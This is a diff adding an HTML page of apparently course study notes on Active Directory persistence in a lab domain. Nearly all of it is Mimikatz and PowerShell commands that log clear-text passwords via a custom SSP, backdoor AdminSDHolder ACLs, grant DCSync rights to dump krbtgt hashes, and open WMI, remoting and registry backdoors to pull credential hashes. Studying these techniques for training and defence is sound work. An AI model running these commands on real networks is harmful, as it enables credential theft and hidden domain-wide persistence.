+  <p>OPSEC order: <strong>Silver</strong> &gt; <strong>Diamond</strong> &gt; <strong>Golden</strong></p>
+</blockquote>
+
+<h2 id="custom-ssp">Custom SSP</h2>
+
+<p>A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>– NTLM
+– Kerberos
+– Wdigest
+– CredSSP
+</code></pre></div></div>
+
+<p>Mimikatz provides a custom SSP - <strong>mimilib.dll</strong>. This SSP logs local logons, service account and machine account passwords in clear text on the target server.</p>
+
+<p><strong>We can use either of the ways</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages:</span><span class="w">
+
+</span><span class="nv">$packages</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ItemProperty</span><span class="w">
+</span><span class="nx">HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Security Packages'</span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="s1">'Security Packages'</span><span class="w">
+</span><span class="nv">$packages</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s2">"mimilib"</span><span class="w">
+</span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="nx">HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Security Packages'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$packages</span><span class="w">
+</span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="nx">HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Security Packages'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$packages</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Using mimikatz, inject into lsass (Not super stable with Server 2019 and Server 2022 but still usable)</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"misc::memssp"'</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>All local logons on the DC are logged to</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\system32\mimilsa.log</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="persistence-using-acls---adminsdholder">Persistence using ACLs - AdminSDHolder</h2>
+
+<ul>
+  <li>Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called <strong>Protected Groups</strong>).</li>
+  <li><strong>Security Descriptor Propagator</strong> (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of <strong>AdminSDHolder</strong> and any differences are overwritten on the object ACL.</li>
+</ul>
+
+<p><img src="/assets/images/posts/crtp/13.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/crtp/14.png" alt="Alt text" class="align-center" /></p>
+
+<ul>
+  <li>With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a <strong>backdoor/persistence</strong> mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.</li>
+  <li>In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.</li>
+</ul>
+
+<h3 id="how-to-do-it">How to do it</h3>
+
+<p><strong>Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s1">'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local'</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">-PrincipalDomain</span><span class="w"> </span><span class="nx">dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-TargetDomain</span><span class="w"> </span><span class="nx">dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Using ActiveDirectory Module and RACE toolkit</strong>:</p>
+
+<p><a href="https://github.com/samratashok/RACE">RACE on GitHub</a></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DCPermissions</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="nx">AdminSDHolder</span><span class="w"> </span><span class="nt">-SAMAccountName</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-Right</span><span class="w"> </span><span class="nx">GenericAll</span><span class="w"> </span><span class="nt">-DistinguishedName</span><span class="w"> </span><span class="s1">'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local'</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s1">'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc	al'</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">ResetPassword</span><span class="w"> </span><span class="nt">-PrincipalDomain</span><span class="w"> </span><span class="nx">dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-TargetDomain</span><span class="w"> </span><span class="nx">dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+
+</span><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s1">'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local'</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">WriteMembers</span><span class="w"> </span><span class="nt">-PrincipalDomain</span><span class="w"> </span><span class="nx">dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-TargetDomain</span><span class="w"> </span><span class="nx">dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-SDPropagator</span><span class="w"> </span><span class="nt">-timeoutMinutes</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-showProgress</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>For pre-Server 2008 machines</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-SDPropagator</span><span class="w"> </span><span class="nt">-taskname</span><span class="w"> </span><span class="nx">FixUpInheritance</span><span class="w"> </span><span class="nt">-timeoutMinutes</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-showProgress</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Check the Domain Admins permission - PowerView as normal user</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Domain Admins'</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Add-Member</span><span class="w"> </span><span class="nx">NoteProperty</span><span class="w"> </span><span class="s1">'IdentityName'</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Convert-SidToName</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="p">);</span><span class="bp">$_</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"student1"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Using ActiveDirectory Module</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">Get-Acl</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local'</span><span class="p">)</span><span class="o">.</span><span class="nf">Access</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'student1'</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Abusing FullControl using PowerView</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Domain Admins'</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="nx">testda</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Using ActiveDirectory Module</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Domain Admins'</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="nx">testda</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Abusing ResetPassword using PowerView</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">testda</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"Password@123"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">)</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Using ActiveDirectory Module</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-ADAccountPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">testda</span><span class="w"> </span><span class="nt">-NewPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"Password@123"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">)</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Abusing ResetPassword using PowerView</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">testda</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"Password@123"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">)</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Using ActiveDirectory Module</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-ADAccountPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">testda</span><span class="w"> </span><span class="nt">-NewPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"Password@123"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">)</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="acls---rights-abuse">ACLs - Rights Abuse</h2>
+
+<blockquote>
+  <p>With DA privileges, the ACL for the domain root can be modified to provide useful rights like <strong>FullControl</strong> or the ability to <strong>run DCSync</strong> for any user.</p>
+</blockquote>
+
+<blockquote>
+  <p>Noisy - detect by MDI because an user other than dc is running dcsync</p>
+</blockquote>
+
+<p>The permissions the user must have to execute DCSync:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Replicating Directory Changes
+- Replicating Directory Changes All
+- Replicating Directory Changes in Filtered Set (in some cases)
+</code></pre></div></div>
+
+<p><strong>DCsync</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="err">“</span><span class="nx">lsadump::dcsync</span><span class="w"> </span><span class="nx">/user:dcorp\krbtgt</span><span class="err">”</span><span class="w"> </span><span class="err">“</span><span class="nx">exit</span><span class="err">”</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Add FullControl rights</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s1">'DC=dollarcorp,DC=moneycorp,DC=local'</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">-PrincipalDomain</span><span class="w"> </span><span class="nx">dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-TargetDomain</span><span class="w"> </span><span class="nx">dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Using ActiveDirectory Module and RACE</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-ADACL</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">studentuser1</span><span class="w"> </span><span class="nt">-DistinguishedName</span><span class="w"> </span><span class="s1">'DC=dollarcorp,DC=moneycorp,DC=local'</span><span class="w"> </span><span class="nt">-Right</span><span class="w"> </span><span class="nx">GenericAll</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Add rights for DCSync</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s1">'DC=dollarcorp,DC=moneycorp,DC=local'</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">DCSync</span><span class="w"> </span><span class="nt">-PrincipalDomain</span><span class="w"> </span><span class="nx">dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-TargetDomain</span><span class="w"> </span><span class="nx">dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Using ActiveDirectory Module and RACE</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-ADACL</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">studentuser1</span><span class="w"> </span><span class="nt">-DistinguishedName</span><span class="w"> </span><span class="s1">'DC=dollarcorp,DC=moneycorp,DC=local'</span><span class="w"> </span><span class="nt">-GUIDRight</span><span class="w"> </span><span class="nx">DCSync</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Execute DCSync</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:dcorp\krbtgt"'</span><span class="w">
+</span></code></pre></div></div>
+<p>or</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:dcorp\krbtgt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Learning Objective 12</p>
+
+<ul>
+  <li>Check if studentx has Replication (DCSync) rights.</li>
+  <li>If yes, execute the DCSync attack to pull hashes of the krbtgt user.</li>
+  <li>If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.</li>
+</ul>
+
+<h2 id="acls---security-descriptors">ACLs - Security Descriptors</h2>
+
+<ul>
+  <li>It is possible to modify <strong>Security Descriptors</strong> (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users.</li>
+  <li>Administrative privileges are required for this.</li>
+  <li>It, of course, works as a very useful and impactful <strong>backdoor mechanism</strong></li>
+</ul>
+
+<p><strong>Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ace_type</span><span class="p">;</span><span class="n">ace_flags</span><span class="p">;</span><span class="n">rights</span><span class="p">;</span><span class="n">object_guid</span><span class="p">;</span><span class="n">inherit_object_guid</span><span class="p">;</span><span class="n">account_sid</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>ACE for built-in administrators for WMI namespaces</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">A</span><span class="p">;</span><span class="n">CI</span><span class="p">;</span><span class="n">CCDCLCSWRPWPRCWD</span><span class="p">;;;</span><span class="n">SID</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="wmi">WMI</h2>
+
+<p>ACLs can be modified to allow non-admin users access to securable objects.</p>
+
+<p><strong>Using the RACE toolkit</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\RACE-master\RACE.ps1</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>On local machine for student1</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-RemoteWMI</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>On remote machine for student1 without explicit credentials</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-RemoteWMI</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nt">-namespace</span><span class="w"> </span><span class="s1">'root\cimv2'</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>On remote machine with explicit credentials. Only root\cimv2 and nested namespaces</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-RemoteWMI</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-namespace</span><span class="w"> </span><span class="s1">'root\cimv2'</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>On remote machine remove permissions</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-RemoteWMI</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc-namespace</span><span class="w"> </span><span class="s1">'root\cimv2'</span><span class="w"> </span><span class="nt">-Remove</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p>example of code execution with WMI:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-WmiMethod</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">win32_process</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">Create</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="err">‘</span><span class="nx">calc.exe</span><span class="err">’</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">
+</span><span class="n">gwmi</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">win32_operatingsystem</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="powershell-remoting">PowerShell Remoting</h2>
+
+<blockquote>
+  <p>Using the RACE toolkit - PS Remoting backdoor not stable after August 2020 patches</p>
+</blockquote>
+
+<p><strong>On local machine for student1</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-RemotePSRemoting</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>On remote machine for student1 without credentials</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-RemotePSRemoting</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>On remote machine, remove the permissions</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-RemotePSRemoting</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nt">-Remove</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="remote-registry">Remote Registry</h2>
+
+<p><strong>Using RACE or DAMP, with admin privs on remote machine</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-RemoteRegBackdoor</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nt">-Trustee</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>As student1, retrieve machine account hash</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-RemoteMachineAccountHash</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Retrieve local account hash</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-RemoteLocalAccountHash</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Retrieve domain cached credentials</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-RemoteCachedCredential</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Learning Objective 13</p>
+
+<ul>
+  <li>Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.</li>
+  <li>Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.</li>
+</ul>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ad" class="page__taxonomy-item" rel="tag">AD</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#begginer" class="page__taxonomy-item" rel="tag">begginer</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#persistence" class="page__taxonomy-item" rel="tag">persistence</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#crtp" class="page__taxonomy-item" rel="tag">crtp</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-12-18T00:00:00+06:00">December 18, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=5+-+AD+Persistence%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrtp%2Fdomdom%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrtp%2Fdomdom%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrtp%2Fdomdom%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/crtp/offdotnet/" class="pagination--pager" title="4 - Offensive .NET
+">Previous</a>
+    
+    
+      <a href="/notes/crtp/domprivesc/" class="pagination--pager" title="6 - AD Privesc
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
